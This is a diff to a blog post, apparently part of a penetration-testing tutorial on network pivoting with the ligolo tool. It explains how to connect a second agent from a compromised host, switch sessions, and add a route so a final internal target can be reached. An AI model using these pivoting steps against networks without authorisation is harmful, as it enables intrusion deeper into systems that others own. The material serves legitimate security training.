@@ -91,4 +91,24 @@ I wiull now assume that you have comrpomised DC02, and need to access FS01 in 17
 ./agent.exe -connect 10.10.15.100:11601 -ignore-cert
 {% endhighlight %}
 
-Back on our proxy
+Back on our proxy, we will see another Agent joined:
+
+<img src="/images/posts/pivoting/ligolo-proxy-agent2-joined.PNGG" alt="pivoting-ligolo-agent-joined2" width="550"/>
+
+To use this new agent, we will first need to type 'session', and using the arrow key to select the new session, hit Enter:
+
+<img src="/images/posts/pivoting/ligolo-proxy-agent2-session.PNG" alt="pivoting-ligolo-session2" width="550"/>
+
+We will then need to type 'start', and confirm that we will switch to the new agent, with 'Yes':
+
+<img src="/images/posts/pivoting/ligolo-proxy-agent2-start.PNG" alt="pivoting-ligolo-start2" width="550"/>
+
+Finally, we will need to add this new route for our interface to use:
+
+{% highlight bash linenos %}
+sudo ip route add 172.18.3.0/24 dev ligolo
+{% endhighlight %}
+
+Now that we have our second ligolo agent connected, we can now hit our final target machine, FS01:
+
+<img src="/images/posts/pivoting/Pivoting-Part3-Session2.PNG" alt="pivoting-ligolo-session2" width="700"/>
